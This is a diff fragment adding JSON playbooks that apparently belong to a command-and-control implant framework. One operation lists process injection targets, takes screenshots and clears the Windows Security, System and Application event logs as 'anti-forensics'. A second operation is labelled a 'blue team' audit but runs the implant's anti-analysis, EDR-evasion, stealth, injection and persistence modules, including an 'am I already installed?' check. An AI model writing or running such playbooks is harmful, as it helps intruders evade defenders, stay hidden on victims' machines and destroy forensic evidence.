+          "action_description": "Process list — injection targets"
+        },
+        {
+          "order": 10,
+          "module": "screenshot",
+          "action": "capture",
+          "params": {
+            "quality": 80
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Screenshot — visual confirmation"
+        },
+        {
+          "order": 11,
+          "module": "builtin",
+          "action": "clear_logs",
+          "params": {
+            "logs": [
+              "Security",
+              "System",
+              "Application"
+            ]
+          },
+          "delay": 5,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Clear event logs — anti-forensics"
+        }
+      ]
+    },
+    {
+      "id": "op_defense_audit",
+      "name": "OP DEFENSE AUDIT — Blue Team Assessment",
+      "description": "Audit defensif: verifie la posture de securite de la machine. Detecte AV/EDR, analyse les processus suspects, verifie les mecanismes de persistance existants, et enumere les vecteurs d'attaque possibles. Rapport complet pour equipe bleue. T1518 + T1057.",
+      "icon": "🛡",
+      "category": "recon",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1518.001",
+        "T1057",
+        "T1082",
+        "T1069"
+      ],
+      "tags": [
+        "defense",
+        "audit",
+        "blue-team",
+        "security",
+        "posture",
+        "assessment",
+        "av",
+        "edr"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — System Posture",
+          "steps": [
+            1,
+            2
+          ]
+        },
+        {
+          "label": "Phase 2 — Defense Detection",
+          "steps": [
+            3,
+            4
+          ]
+        },
+        {
+          "label": "Phase 3 — Process Analysis",
+          "steps": [
+            5,
+            6
+          ]
+        },
+        {
+          "label": "Phase 4 — Persistence Audit",
+          "steps": [
+            7,
+            8
+          ]
+        },
+        {
+          "label": "Phase 5 — Network Exposure",
+          "steps": [
+            9
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 0,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Full system info — OS, version, arch, RAM, CPU"
+        },
+        {
+          "order": 2,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {
+            "abort_on_detected": false
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Anti-analysis check — VM? sandbox? debugger?"
+        },
+        {
+          "order": 3,
+          "module": "edr_evasion",
+          "action": "status",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "EDR status — AMSI/ETW/NTDLL hook state"
+        },
+        {
+          "order": 4,
+          "module": "stealth",
+          "action": "indicators",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Stealth indicators — user activity, idle time"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "processes",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "List all running processes — find suspicious"
+        },
+        {
+          "order": 6,
+          "module": "injection",
+          "action": "list_processes",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Process list with arch and session info"
+        },
+        {
+          "order": 7,
+          "module": "persistence",
+          "action": "check",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Check existing persistence — am I already installed?"
+        },
+        {
+          "order": 8,
+          "module": "persistence_adv",
+          "action": "list_persistence",
+          "params": {},
+          "delay": 1,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "List all persistence mechanisms — audit"
+        },
+        {
+          "order": 9,
+          "module": "builtin",
+          "action": "netstat",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Network connections — exposure assessment"
+        }
+      ]
+    }
+  ]
+}
